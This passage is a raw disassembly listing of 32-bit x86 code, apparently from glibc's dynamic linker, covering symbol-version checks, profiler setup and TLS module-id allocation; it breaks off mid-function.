pop esi
leave
ret
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push edi
mov edi, edx
push esi
mov esi, ecx
push ebx
sub esp, 0xb0
test byte [0x80aac10], 0x10
mov edx, dword [arg_8h]
mov dword [var_a0h], eax
mov eax, dword [edx + 0x2c]
mov eax, dword [eax + 4]
mov dword [var_a8h], 0
mov dword [var_a4h], eax
jne 0x8082034
mov edx, dword [arg_8h]
mov eax, dword [edx + 0xac]
test eax, eax
je 0x8081fc3
mov eax, dword [eax + 4]
test eax, eax
je 0x8082066
mov edx, dword [var_4h]
mov ebx, dword [edx]
add ebx, eax
cmp word [ebx], 1
jne 0x8081f29
cmp edi, dword [ebx + 8]
je 0x8081f01
mov eax, dword [ebx + 0x10]
test eax, eax
jne 0x8081d9d
mov edx, dword [var_ch]
test edx, edx
je 0x8081e71
mov eax, dword [var_8h]
xor edx, edx
test eax, eax
jne 0x8081ddc
lea esi, [esi]
lea esp, [var_bp_ch]
mov eax, edx
pop ebx
pop esi
pop edi
leave
ret 0xc
mov eax, dword [var_a0h_2]
mov dword [var_78h], esi
mov dword [var_7ch], str.weak_version__
mov dword [var_74h], str._not_found__required_by_
mov dword [var_6ch], 0x8092e9e
mov esi, 1
xor ebx, ebx
mov dword [var_70h], eax
mov eax, dword [ebp + ebx*4 - 0x7c]
inc ebx
mov dword [esp], eax
call fcn.08053400
add esi, eax
cmp ebx, 4
jbe 0x8081e04
lea eax, [esi + 0x12]
xor ebx, ebx
and eax, 0xfffffffc
sub esp, eax
lea esi, [var_23h]
and esi, 0xfffffff0
mov edx, esi
mov eax, dword [ebp + ebx*4 - 0x7c]
mov dword [esp], edx
inc ebx
mov dword [var_4h], eax
call fcn.080773c0
cmp ebx, 4
mov edx, eax
mov ecx, esi
jbe 0x8081e2b
mov eax, dword [arg_8h]
mov edx, dword [eax + 4]
cmp byte [edx], 0
jne 0x8081e57
mov eax, dword [0x80a95a8]
mov edx, dword [eax]
mov dword [esp], ecx
xor eax, eax
xor ecx, ecx
call fcn.08081380
sub esp, 4
mov edx, dword [var_a8h]
jmp 0x8081dd0
mov edx, dword [var_a0h_2]
mov dword [var_98h], esi
mov dword [var_9ch], 0x80a47b5
mov dword [var_94h], str._not_found__required_by_
mov dword [var_8ch], 0x8092e9e
mov esi, 1
xor ebx, ebx
mov dword [var_90h], edx
mov eax, dword [ebp + ebx*4 - 0x9c]
inc ebx
mov dword [esp], eax
call fcn.08053400
add esi, eax
cmp ebx, 4
jbe 0x8081ea8
lea eax, [esi + 0x12]
xor ebx, ebx
and eax, 0xfffffffc
sub esp, eax
lea esi, [var_23h]
and esi, 0xfffffff0
mov edx, esi
mov eax, dword [ebp + ebx*4 - 0x9c]
mov dword [esp], edx
inc ebx
mov dword [var_4h], eax
call fcn.080773c0
cmp ebx, 4
mov edx, eax
jbe 0x8081ed2
lea esi, [esi]
mov ecx, esi
mov dword [var_a8h_2], 1
jmp 0x8081e45
mov eax, ebx
mov edx, dword [var_a4h_2]
add eax, dword [ebx + 0xc]
add edx, dword [eax]
mov dword [esp], esi
mov dword [var_4h], edx
call fcn.08076e50
xor edx, edx
test eax, eax
je 0x8081dd0
jmp 0x8081db2
lea eax, [var_29h]
mov byte [var_29h], 0
mov dword [var_10h], 0
mov dword [var_ch], 0xa
mov dword [var_8h], eax
mov dword [var_5ch], str.unsupported_version_
movzx eax, word [ebx]
mov esi, 1
xor ebx, ebx
mov dword [var_4h], 0
mov dword [esp], eax
call fcn.08063ca0
mov dword [var_44h], str._of_Verdef_record
mov edx, dword [var_5ch]
mov dword [var_58h], eax
mov dword [var_54h], str._of_Verdef_record
mov dword [var_48h], eax
mov dword [var_4ch], edx
mov eax, dword [ebp + ebx*4 - 0x4c]
inc ebx
mov dword [esp], eax
call fcn.08053400
add esi, eax
cmp ebx, 2
jbe 0x8081f7f
lea eax, [esi + 0x12]
xor ebx, ebx
and eax, 0xfffffffc
sub esp, eax
lea esi, [var_23h]
and esi, 0xfffffff0
mov edx, esi
mov eax, dword [ebp + ebx*4 - 0x4c]
mov dword [esp], edx
inc ebx
mov dword [var_4h], eax
call fcn.080773c0
cmp ebx, 2
mov edx, eax
jbe 0x8081fa6
jmp 0x8081ef0
mov ecx, dword [arg_ch]
xor edx, edx
test ecx, ecx
je 0x8081dd0
mov eax, dword [var_a0h]
mov dword [var_1ch], str.no_version_information_available__required_by_
mov dword [var_14h], 0x8092e9e
mov esi, 1
xor ebx, ebx
mov dword [var_18h], eax
mov eax, dword [ebp + ebx*4 - 0x1c]
inc ebx
mov dword [esp], eax
call fcn.08053400
add esi, eax
cmp ebx, 2
jbe 0x8081fee
lea eax, [esi + 0x12]
xor ebx, ebx
and eax, 0xfffffffc
sub esp, eax
lea esi, [var_23h]
and esi, 0xfffffff0
mov edx, esi
mov eax, dword [ebp + ebx*4 - 0x1c]
mov dword [esp], edx
inc ebx
mov dword [var_4h], eax
call fcn.080773c0
cmp ebx, 2
mov edx, eax
mov ecx, esi
jbe 0x8082015
jmp 0x8081e45
mov eax, dword [var_a0h]
mov dword [var_ch], eax
mov eax, dword [edx + 4]
cmp byte [eax], 0
jne 0x808204d
mov eax, dword [0x80a95a8]
mov eax, dword [eax]
mov dword [var_8h], eax
mov dword [var_4h], esi
mov dword [esp], str.checking_for_version___s_in_file__s_required_by_file__s_n
call fcn.08081c40
jmp 0x8081d7c
mov dword [var_ch], str.match_symbol
mov dword [var_8h], 0x70
mov dword [var_4h], str.dl_version.c
mov dword [esp], str.def_offset___0
call fcn.0805efc0
lea esi, [esi]
push ebp
mov ebp, esp
push edi
xor edi, edi
push esi
push ebx
sub esp, 0x78
mov dword [var_6ch], 0
mov dword [var_5ch], 0
mov dword [var_50h], eax
mov dword [var_54h], edx
mov dword [var_58h], ecx
mov eax, dword [eax + 0x2c]
xor edx, edx
test eax, eax
je 0x80821fc
mov eax, dword [eax + 4]
mov ecx, dword [var_50h]
mov dword [var_60h], eax
mov ecx, dword [ecx + 0xa4]
mov eax, dword [var_50h]
mov eax, dword [eax + 0xac]
test ecx, ecx
mov dword [var_64h], ecx
mov dword [var_68h], eax
je 0x80821c2
mov edx, dword [ecx + 4]
mov ecx, dword [var_50h_2]
mov ecx, dword [ecx]
add edx, ecx
cmp word [edx], 1
mov dword [var_70h_2], edx
jne 0x8082385
lea esi, [esi]
mov edx, dword [var_70h]
mov ebx, dword [0x80aac58]
mov esi, dword [var_60h]
add esi, dword [edx + 4]
test ebx, ebx
je 0x8082129
mov edx, ebx
mov eax, esi
mov edi, ebx
call fcn.08081cd0
test eax, eax
jne 0x808213c
mov ebx, dword [ebx + 0xc]
test ebx, ebx
jne 0x8082113
mov ecx, dword [var_50h]
xor ebx, ebx
cmp ebx, dword [ecx + 0x154]
jb 0x808234c
xor edi, edi
test edi, edi
je 0x8082421
mov eax, dword [var_58h_2]
test eax, eax
jne 0x808233a
mov ebx, dword [var_70h_2]
add ebx, dword [ebx + 8]
mov edx, dword [var_50h_2]
mov ecx, dword [var_60h_2]
add ecx, dword [ebx + 8]
mov eax, dword [edx + 4]
cmp byte [eax], 0
je 0x808232e
mov esi, eax
movzx eax, word [ebx + 4]
mov dword [esp], edi
and eax, 2
mov dword [var_8h], eax
mov eax, dword [var_54h]
mov dword [var_4h], eax
mov eax, esi
mov edx, dword [ebx]
call fcn.08081d40
or dword [var_5ch], eax
sub esp, 0xc
movzx eax, word [ebx + 6]
and eax, 0x7fff
cmp eax, dword [var_6ch]
cmovbe eax, dword [var_6ch]
mov dword [var_6ch], eax
mov eax, dword [ebx + 0xc]
test eax, eax
je 0x80821ae
add ebx, eax
jmp 0x8082155
mov edx, dword [var_70h]
mov eax, dword [edx + 0xc]
test eax, eax
je 0x80821c2
add edx, eax
mov dword [var_70h], edx
jmp 0x8082100
mov eax, dword [var_68h]
test eax, eax
je 0x80821f2
mov ecx, dword [var_68h_2]
mov eax, dword [var_50h_2]
mov edx, dword [ecx + 4]
add edx, dword [eax]
movzx eax, word [edx + 4]
and eax, 0x7fff
cmp eax, dword [var_6ch_2]
cmovbe eax, dword [var_6ch_2]
mov dword [var_6ch_2], eax
mov eax, dword [edx + 0x10]
test eax, eax
je 0x80821f2
add edx, eax
jmp 0x80821d4
mov edi, dword [var_6ch]
test edi, edi
jne 0x8082206
mov edx, dword [var_5ch_2]
lea esp, [var_ch]
mov eax, edx
pop ebx
pop esi
pop edi
leave
ret
mov ebx, dword [var_6ch]
mov dword [var_4h], 0x10
inc ebx
mov dword [esp], ebx
call fcn.08051730
mov ecx, dword [var_50h]
test eax, eax
mov edx, eax
mov dword [ecx + 0x17c], eax
je 0x8082306
mov eax, dword [var_50h_2]
mov esi, dword [var_64h_2]
mov ecx, eax
mov dword [eax + 0x178], ebx
test esi, esi
mov eax, dword [eax + 0xdc]
mov eax, dword [eax + 4]
mov dword [ecx + 0x18c], eax
je 0x80822a8
mov eax, dword [var_64h_2]
mov esi, edx
mov edi, dword [eax + 4]
add edi, dword [ecx]
mov ebx, edi
add ebx, dword [edi + 8]
lea esi, [esi]
movzx edx, word [ebx + 6]
mov eax, dword [ebx]
mov ecx, edx
and edx, 0x8000
and ecx, 0x7fff
shl ecx, 4
mov dword [esi + ecx + 4], eax
mov dword [esi + ecx + 8], edx
mov eax, dword [var_60h_2]
add eax, dword [ebx + 8]
mov dword [esi + ecx], eax
mov eax, dword [var_60h_2]
add eax, dword [edi + 4]
mov dword [esi + ecx + 0xc], eax
mov eax, dword [ebx + 0xc]
test eax, eax
je 0x808229d
add ebx, eax
jmp 0x8082260
mov eax, dword [edi + 0xc]
test eax, eax
je 0x80822a8
add edi, eax
jmp 0x8082258
mov ebx, dword [var_68h_2]
test ebx, ebx
je 0x80821f9
mov edx, dword [var_68h_2]
mov ecx, dword [var_50h_2]
mov ebx, dword [edx + 4]
add ebx, dword [ecx]
mov esi, ebx
add esi, dword [ebx + 0xc]
test byte [ebx + 2], 1
jne 0x80822f7
movzx eax, word [ebx + 4]
mov edx, dword [var_50h_2]
mov ecx, dword [edx + 0x17c]
mov edx, dword [ebx + 8]
and ax, 0x7fff
movzx eax, ax
shl eax, 4
mov dword [ecx + eax + 4], edx
mov dword [ecx + eax + 0xc], 0
mov edx, dword [var_60h_2]
add edx, dword [esi]
mov dword [ecx + eax], edx
mov eax, dword [ebx + 0x10]
test eax, eax
je 0x80821f9
add ebx, eax
jmp 0x80822be
mov ecx, str.cannot_allocate_version_reference_table
mov edi, 0xc
mov eax, dword [var_50h]
mov edx, dword [eax + 4]
cmp byte [edx], 0
jne 0x8082322
mov eax, dword [0x80a95a8]
mov edx, dword [eax]
mov dword [esp], ecx
mov eax, edi
xor ecx, ecx
call fcn.08081200
mov eax, dword [0x80a95a8]
mov esi, dword [eax]
jmp 0x808216c
test byte [edi + 0x175], 2
je 0x808214f
jmp 0x80821ae
mov edx, dword [var_50h]
mov eax, dword [edx + 0x150]
mov edx, dword [eax + ebx*4]
mov eax, esi
call fcn.08081cd0
test eax, eax
jne 0x8082374
mov ecx, dword [var_50h_2]
inc ebx
cmp ebx, dword [ecx + 0x154]
jb 0x808234c
jmp 0x808213a
mov edx, dword [var_50h]
mov eax, dword [edx + 0x150]
mov edi, dword [eax + ebx*4]
jmp 0x808213c
lea eax, [var_19h]
mov byte [var_19h], 0
mov dword [var_sp_10h], 0
mov dword [esp + 0xc], 0xa
mov dword [var_8h], eax
mov dword [var_4ch], str.unsupported_version_
movzx eax, word [edx]
mov esi, 1
xor ebx, ebx
mov dword [var_4h], 0
mov dword [esp], eax
call fcn.08063ca0
mov dword [var_34h], str._of_Verneed_record_n
mov edx, dword [var_4ch]
mov dword [var_48h], eax
mov dword [var_44h], str._of_Verneed_record_n
mov dword [var_38h], eax
mov dword [var_3ch], edx
mov eax, dword [ebp + ebx*4 - 0x3c]
inc ebx
mov dword [esp], eax
call fcn.08053400
add esi, eax
cmp ebx, 2
jbe 0x80823db
lea eax, [esi + 0x12]
xor ebx, ebx
and eax, 0xfffffffc
sub esp, eax
lea esi, [var_23h]
and esi, 0xfffffff0
mov edx, esi
mov eax, dword [ebp + ebx*4 - 0x3c]
mov dword [esp], edx
inc ebx
mov dword [var_4h], eax
call fcn.080773c0
cmp ebx, 2
mov edx, eax
jbe 0x8082402
mov ecx, esi
jmp 0x8082310
mov dword [var_sp_ch], str._dl_check_map_versions
mov dword [var_8h_2], 0xe5
mov dword [var_4h_2], str.dl_version.c
mov dword [esp], str.needed_____void__0_
call fcn.0805efc0
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
push edi
xor edi, edi
push esi
push ebx
mov ebx, eax
sub esp, 8
test eax, eax
mov dword [var_14h], ecx
mov dword [var_10h], edx
je 0x808247b
xor esi, esi
test byte [ebx + 0x175], 2
je 0x8082485
mov ebx, dword [ebx + 0xc]
or edi, esi
test ebx, ebx
jne 0x8082467
add esp, 8
mov eax, edi
pop ebx
pop esi
pop edi
leave
ret
mov ecx, dword [var_14h]
mov edx, dword [var_10h]
mov eax, ebx
call fcn.08082090
test eax, eax
mov eax, 1
cmovne esi, eax
jmp 0x8082472
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x28c
mov esi, dword [0x80aac60]
mov dword [var_250h], 0
mov dword [var_240h], 0xffffffff
mov dword [var_244h], 0
movzx eax, word [esi + 0x14c]
mov ecx, dword [esi + 0x144]
shl eax, 5
lea eax, [eax + ecx]
cmp ecx, eax
jae 0x8082530
mov edx, dword [0x80aac74]
mov ebx, eax
mov dword [var_258h], edx
neg edx
mov dword [var_274h], edx
lea esi, [esi]
cmp dword [ecx], 1
je 0x8082bc0
add ecx, 0x20
cmp ecx, ebx
jb 0x8082520
mov edx, dword [esi]
mov eax, dword [var_240h]
mov dword [0x80aaa14], 0
mov ecx, dword [var_244h]
mov dword [0x80aaa38], 4
add eax, edx
lea edx, [edx + ecx + 3]
and eax, 0xfffffffc
and edx, 0xfffffffc
mov dword [0x80aaa30], eax
mov esi, edx
mov dword [var_25ch], edx
sub esi, eax
mov eax, 0x51eb851f
lea edx, [esi + esi*2]
mov edi, esi
mov dword [0x80aaa34], esi
mul edx
shr edi, 1
mov eax, 0x32
mov dword [var_24ch], edi
shr edx, 5
cmp edx, 0x31
cmova eax, edx
cmp eax, 0x100000
mov dword [0x80aaa28], eax
mov edx, eax
jbe 0x80825b2
mov edx, 0x100000
mov dword [0x80aaa28], 0x100000
lea eax, [edx*8]
xor ebx, ebx
mov ecx, 5
shl edx, 4
mov dword [var_260h], eax
lea edi, [var_8ch]
lea eax, [eax + edx]
shr esi, 2
mov edx, dword [var_24ch]
cld
lea eax, [edx + eax*4 + 0x40]
mov dword [var_254h], eax
mov eax, ebx
rep stosd dword es:[edi], eax
mov dword [var_a4h], esi
mov dword [var_8ch], 0x6e6f6d67
mov dword [var_88h], 0x1ffff
lea edi, [var_94h]
mov edx, dword [var_240h]
mov ecx, dword [var_244h]
mov dword [var_ach], edx
mov dword [var_a8h], ecx
call fcn.08090d00
mov dword [var_a0h], eax
mov ecx, 1
mov dword [var_9ch], 0x6f636573
cld
mov eax, ebx
mov dword [var_98h], 0x73646e
rep stosd dword es:[edi], eax
mov word [edi], 0
mov byte [edi + 2], 0
mov ebx, dword [0x80aabfc]
mov byte [var_8dh], 0x73
mov dword [esp], ebx
call fcn.08053400
mov esi, eax
mov eax, dword [0x80aac20]
mov dword [esp], eax
call fcn.08053400
lea eax, [eax + esi + 0x1c]
and eax, 0xfffffffc
sub esp, eax
lea edx, [var_27h]
and edx, 0xfffffff0
mov dword [var_264h], edx
mov dword [esp], edx
mov dword [var_4h], ebx
call fcn.080773c0
mov byte [eax], 0x2f
mov edx, dword [0x80aac20]
inc eax
mov dword [esp], eax
mov dword [var_4h], edx
call fcn.080773c0
mov dword [var_4h], str..profile
mov dword [var_8h], 9
mov dword [esp], eax
call fcn.08053740
mov dword [var_4h], 0x20042
mov dword [var_8h], 0x1b6
mov ecx, dword [var_264h]
mov dword [esp], ecx
call fcn.08053ec0
mov dword [var_278h], eax
inc eax
je 0x8082baf
lea eax, [var_6ch]
mov dword [var_8h], eax
mov edx, dword [var_278h]
mov dword [esp], 3
mov dword [var_4h], edx
call fcn.08053dc0
test eax, eax
js 0x8082723
mov eax, dword [var_5ch]
and eax, 0xf000
cmp eax, 0x8000
je 0x8082786
mov esi, str._s:_cannot_stat_file:__s_n
call fcn.08048b20
cmp dword [var_278h], 0xffffffff
mov ebx, dword [eax]
je 0x8082746
mov edi, dword [var_278h]
mov dword [esp], edi
call fcn.08053f20
lea eax, [var_23ch]
mov dword [var_8h], 0x190
mov dword [esp], ebx
mov dword [var_4h], eax
call fcn.08053300
mov dword [var_ch], eax
mov eax, dword [var_264h]
mov dword [var_4h], esi
mov dword [var_8h], eax
mov dword [esp], 2
call fcn.08081ca0
lea esp, [var_bp_ch]
pop ebx
pop esi
pop edi
leave
ret
mov esi, dword [var_3ch]
mov ebx, dword [var_40h]
mov ecx, esi
or ecx, ebx
mov dword [var_268h], ecx
jne 0x8082b71
mov edx, dword [0x80aac74]
mov dword [var_26ch], esp
cld
lea eax, [edx + 0x12]
mov ecx, edx
and eax, 0xfffffffc
shr ecx, 2
sub esp, eax
mov eax, dword [var_268h_2]
lea esi, [var_27h]
and esi, 0xfffffff0
test dl, 2
mov edi, esi
rep stosd dword es:[edi], eax
mov ebx, edi
je 0x80827d6
mov word [edi], 0
add ebx, 2
and edx, 1
je 0x80827de
mov byte [ebx], 0
mov dword [var_8h], 0
mov eax, dword [0x80aac74]
dec eax
not eax
and eax, dword [var_250h_2]
mov dword [var_4h], eax
mov eax, dword [var_274h]
mov dword [esp], eax
call fcn.08090150
inc eax
je 0x8082b61
mov eax, dword [0x80aac74]
dec eax
and eax, dword [var_250h_2]
mov dword [var_4h], esi
mov dword [var_8h], eax
mov edx, dword [var_274h]
mov dword [esp], edx
call fcn.08053fd0
cmp eax, 0xffffffff
mov ebx, eax
jne 0x8082840
call fcn.08048b20
cmp dword [eax], 4
je 0x808280d
test ebx, ebx
js 0x8082b61
mov esp, dword [var_26ch_2]
mov dword [var_14h], 0
mov esi, str._s:_cannot_map_file:__s_n
mov eax, dword [var_278h]
mov dword [var_ch], 1
mov dword [var_8h], 3
mov dword [var_10h], eax
mov edx, dword [var_254h]
mov dword [esp], 0
mov dword [var_4h], edx
call fcn.080546d0
mov dword [var_250h], eax
inc eax
je 0x8082728
mov ecx, dword [var_278h]
mov dword [esp], ecx
call fcn.08053f20
mov edx, dword [var_3ch]
mov esi, dword [var_250h]
mov ecx, dword [var_250h]
add esi, 0x38
mov edi, edx
mov eax, esi
add ecx, 0x14
mov dword [var_248h], esi
add eax, dword [var_24ch]
lea ebx, [eax + 4]
add eax, 8
mov dword [0x80aaa10], eax
mov dword [0x80aaa1c], ebx
mov eax, dword [var_40h]
or edi, eax
jne 0x8082ade
mov eax, dword [var_8ch_2]
mov edx, dword [var_250h_2]
mov dword [edx], eax
mov eax, dword [var_88h_2]
mov dword [edx + 4], eax
mov eax, dword [var_84h]
mov dword [edx + 8], eax
mov eax, dword [var_80h]
mov dword [edx + 0xc], eax
mov eax, dword [var_7ch]
mov dword [edx + 0x14], 0
mov dword [edx + 0x10], eax
mov eax, dword [var_ach_2]
mov dword [ecx + 4], eax
mov eax, dword [var_a8h_2]
mov dword [ecx + 8], eax
mov eax, dword [var_a4h_2]
mov dword [ecx + 0xc], eax
mov eax, dword [var_a0h_2]
mov dword [ecx + 0x10], eax
mov eax, dword [var_9ch_2]
mov dword [ecx + 0x14], eax
mov eax, dword [var_98h_2]
mov dword [ecx + 0x18], eax
mov eax, dword [var_94h_2]
mov dword [ecx + 0x1c], eax
mov eax, dword [var_90h]
mov dword [ecx + 0x20], eax
mov eax, dword [0x80aaa1c]
mov dword [eax - 4], 1
mov dword [var_4h], 1
mov eax, dword [var_24ch]
add eax, dword [var_260h]
mov dword [esp], eax
call fcn.08051730
test eax, eax
mov dword [0x80aaa20], eax
je 0x8082c13
mov eax, dword [0x80aaa20]
mov ecx, dword [0x80aaa1c]
mov dword [0x80aaa2c], 0
mov edx, dword [0x80aaa28]
mov edi, eax
mov dword [var_270h], eax
add edi, dword [var_24ch_2]
mov eax, dword [ecx]
cmp eax, edx
mov dword [0x80aaa24], edi
jae 0x80829ce
mov edx, dword [ecx]
test edx, edx
mov dword [0x80aaa18], edx
mov esi, edx
je 0x8082a3a
mov edx, dword [0x80aaa10]
lea eax, [esi + esi*2]
mov edi, dword [0x80aaa24]
lea ebx, [eax*4]
mov dword [var_274h], edx
mov eax, dword [var_274h]
sub ebx, 0xc
mov ecx, dword [eax + ebx + 4]
mov eax, dword [0x80aaa2c]
mov edx, eax
shr ecx, 2
inc eax
mov dword [0x80aaa2c], eax
mov eax, dword [var_274h]
add eax, ebx
dec esi
mov dword [edi + edx*8], eax
mov eax, dword [var_270h]
movzx eax, word [eax + ecx*2]
mov word [edi + edx*8 + 4], ax
mov eax, dword [var_270h]
mov word [eax + ecx*2], dx
jne 0x80829f6
mov ecx, dword [var_25ch_2]
mov eax, 0x10000
sub ecx, dword [0x80aaa30]
cmp dword [var_24ch_2], ecx
jae 0x8082a9b
xor edx, edx
mov eax, ecx
div dword [var_24ch_2]
mov ebx, eax
mov eax, 1
cmp ebx, 0xffff
ja 0x8082a9b
cmp ebx, 0xff
mov eax, 0x10000
ja 0x8082a97
cmp ecx, 0xffffff
jbe 0x8082acf
mov ebx, dword [var_24ch_2]
mov eax, ecx
xor edx, edx
shr ebx, 8
div ebx
mov ebx, eax
mov eax, 0x1000000
xor edx, edx
div ebx
mov dword [var_ch], eax
mov eax, dword [0x80aaa30]
mov dword [var_8h], eax
mov ecx, dword [var_24ch_2]
mov dword [var_4h], ecx
mov esi, dword [var_248h_2]
mov dword [esp], esi
call fcn.08090b50
mov dword [0x80aaa14], 1
jmp 0x808277e
shl ecx, 8
xor edx, edx
mov eax, ecx
div dword [var_24ch_2]
jmp 0x8082a90
mov esi, dword [var_250h]
mov ecx, 0x14
lea edi, [var_8ch]
cld
repe cmpsb byte [esi], byte ptr es:[edi]
jne 0x8082b1f
mov ecx, dword [var_250h]
mov eax, dword [ecx + 0x14]
test eax, eax
jne 0x8082b1f
mov esi, ecx
lea edi, [var_ach]
mov ecx, 0x20
add esi, 0x18
repe cmpsb byte [esi], byte ptr es:[edi]
jne 0x8082b1f
mov eax, dword [ebx - 4]
dec eax
je 0x808296e
mov edx, dword [var_250h]
test edx, edx
je 0x8082b41
mov ecx, dword [var_254h]
mov dword [var_4h], ecx
mov esi, dword [var_250h]
mov dword [esp], esi
call fcn.08054780
mov eax, dword [0x80aac20]
mov dword [var_ch], eax
mov edi, dword [var_264h]
mov dword [var_4h], str._s:_file_is_no_correct_profile_data_file_for___s_n
mov dword [var_8h], edi
jmp 0x8082772
mov esi, str._s:_cannot_create_file:__s_n
mov esp, dword [var_26ch_2]
jmp 0x8082728
mov eax, dword [var_254h]
cdq
mov dword [var_280h], eax
mov eax, dword [var_280h]
mov dword [var_27ch], edx
mov ecx, dword [var_27ch]
xor eax, ebx
xor ecx, esi
or ecx, eax
je 0x808284e
mov edx, dword [var_278h_2]
mov dword [esp], edx
call fcn.08053f20
jmp 0x8082b1f
mov esi, str._s:_cannot_open_file:__s_n
jmp 0x8082728
lea esi, [esi]
test byte [ecx + 0x18], 1
je 0x8082529
mov eax, dword [ecx + 8]
mov edx, dword [var_274h]
mov edi, dword [var_258h]
and edx, eax
add eax, dword [ecx + 0x14]
lea eax, [edi + eax - 1]
and eax, dword [var_274h]
cmp edx, dword [var_240h_2]
cmovae edx, dword [var_240h_2]
cmp eax, dword [var_244h_2]
cmovbe eax, dword [var_244h_2]
mov dword [var_240h_2], edx
mov dword [var_244h_2], eax
jmp 0x8082529
mov esi, dword [var_254h]
mov dword [var_4h], esi
mov edi, dword [var_250h]
mov dword [esp], edi
call fcn.08054780
mov dword [var_4h], str.Out_of_memory_while_initializing_profiler_n
mov dword [esp], 2
call fcn.08081ca0
mov dword [esp], 0x7f
call fcn.08053d90
nop
lea esi, [esi]
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x1c
mov ecx, dword [0x80aaa14]
test ecx, ecx
je 0x8082e18
mov ecx, dword [0x80aaa30]
mov edx, dword [0x80aaa34]
mov eax, 0
sub dword [arg_8h], ecx
cmp dword [arg_8h], edx
cmovb eax, dword [arg_8h]
sub dword [arg_ch], ecx
cmp dword [arg_ch], edx
mov dword [arg_8h], eax
jae 0x8082e18
mov ecx, dword [0x80aaa38]
mov eax, dword [arg_ch]
mov edx, dword [0x80aaa20]
shr eax, cl
lea eax, [edx + eax*2]
mov dword [var_1ch], edx
mov dword [var_18h], eax
movzx eax, word [eax]
movzx eax, ax
test eax, eax
je 0x8082d03
mov esi, dword [0x80aaa24]
lea ebx, [esi + eax*8]
mov edx, dword [ebx]
mov eax, dword [edx]
cmp eax, dword [arg_8h]
je 0x8082e14
movzx ecx, word [ebx + 4]
test cx, cx
je 0x8082cf2
movzx eax, cx
lea ebx, [esi + eax*8]
movzx eax, word [ebx + 4]
test ax, ax
mov ecx, eax
je 0x8082e2e
mov edx, dword [ebx]
mov eax, dword [edx]
cmp eax, dword [arg_8h]
jne 0x8082cd4
mov eax, dword [edx]
cmp eax, dword [arg_8h]
je 0x8082e14
add ebx, 4
mov dword [var_18h], ebx
mov ebx, dword [0x80aaa1c]
mov edx, dword [0x80aaa18]
mov dword [var_24h], ebx
mov esi, dword [var_24h]
mov ebx, edx
mov eax, dword [esi]
cmp edx, eax
je 0x8082d9b
mov eax, dword [0x80aaa28]
cmp edx, eax
mov dword [var_28h], eax
jae 0x8082d9b
mov ecx, dword [0x80aaa10]
mov esi, dword [0x80aaa24]
mov edi, 1
mov dword [var_20h], ecx
lea eax, [edx + edx*2]
mov edx, dword [var_20h]
mov ecx, dword [edx + eax*4 + 4]
mov eax, edi
shr ecx, 2
lock xadd dword [0x80aaa2c], eax
mov dword [var_10h], eax
mov eax, dword [var_10h]
mov edx, dword [var_10h]
lea eax, [ebx + ebx*2]
inc edx
mov ebx, dword [var_20h]
lea eax, [ebx + eax*4]
mov ebx, dword [var_1ch]
mov dword [esi + edx*8], eax
movzx eax, word [ebx + ecx*2]
mov word [esi + edx*8 + 4], ax
mov word [ebx + ecx*2], dx
lock inc dword [0x80aaa18]
mov edx, dword [0x80aaa18]
mov ecx, dword [var_24h]
mov eax, dword [ecx]
mov ebx, edx
cmp edx, eax
je 0x8082d9b
cmp edx, dword [var_28h]
jb 0x8082d41
mov ebx, dword [var_18h]
movzx eax, word [ebx]
test ax, ax
jne 0x8082e20
mov eax, 1
mov esi, dword [var_24h]
mov ecx, eax
lock xadd dword [esi], ecx
cmp ecx, dword [0x80aaa28]
jae 0x8082e18
lock xadd dword [0x80aaa2c], eax
mov dword [var_14h], eax
mov eax, dword [var_14h]
mov eax, dword [var_14h]
mov esi, dword [arg_8h]
mov edx, dword [0x80aaa24]
inc eax
mov word [ebx], ax
movzx eax, word [ebx]
movzx eax, ax
lea ebx, [edx + eax*8]
mov edx, dword [0x80aaa10]
lea eax, [ecx + ecx*2]
shl eax, 2
mov word [ebx + 4], 0
lea ecx, [eax + edx]
mov dword [ecx], esi
mov dword [ebx], ecx
mov esi, dword [arg_ch]
mov dword [edx + eax + 8], 0
mov dword [edx + eax + 4], esi
lock inc dword [0x80aaa18]
mov edx, ecx
lock inc dword [edx + 8]
add esp, 0x1c
pop ebx
pop esi
pop edi
leave
ret
mov edx, dword [var_18h]
movzx eax, word [edx]
movzx eax, ax
jmp 0x8082cb5
mov edx, dword [ebx]
jmp 0x8082cf2
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
sub esp, 0x24
cmp byte [0x80aabe0], 0
mov dword [var_ch], ebx
mov dword [var_8h], esi
mov dword [var_4h], edi
jne 0x8082e75
mov ebx, dword [0x80aabd8]
lea eax, [ebx + 1]
mov dword [0x80aabd8], eax
mov edx, eax
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov eax, edx
mov edi, dword [var_4h]
leave
ret
mov edx, dword [0x80aabe8]
mov ebx, dword [0x80aabd8]
mov dword [var_10h], 0
mov esi, dword [0x80aabdc]
inc edx
mov dword [var_14h], ebx
cmp edx, ebx
ja 0x8082f31
mov eax, edx
mov ecx, dword [esi]
sub eax, dword [var_10h]
cmp eax, ecx
jae 0x8082ec6
mov edi, dword [var_14h]
inc edi
lea esi, [esi]
mov eax, dword [esi + eax*8 + 0xc]
test eax, eax
je 0x8082ec6
inc edx
cmp edx, edi
ja 0x8082f10
mov eax, edx
sub eax, dword [var_10h]
cmp eax, ecx
jb 0x8082eb0
mov eax, edx
sub eax, dword [var_10h]
cmp eax, ecx
jb 0x8082ed9
mov esi, dword [esi + 4]
add dword [var_10h], ecx
test esi, esi
jne 0x8082e9a
cmp edx, dword [var_14h]
jb 0x8082e68
jne 0x8082eec
mov byte [0x80aabe0], 0
jmp 0x8082e5e
mov dword [var_sp_ch], str._dl_next_tls_modid
mov dword [var_sp_8h], 0x5f
mov dword [var_sp_4h], str..._sysdeps_generic_dl_tls.c
mov dword [esp], str.result___dl_tls_max_dtv_idx
call fcn.0805efc0
mov dword [var_sp_ch], str._dl_next_tls_modid
mov dword [var_sp_8h], 0x51
mov dword [var_sp_4h], str..._sysdeps_generic_dl_tls.c
mov dword [esp], str.result____dl_tls_max_dtv_idx__1
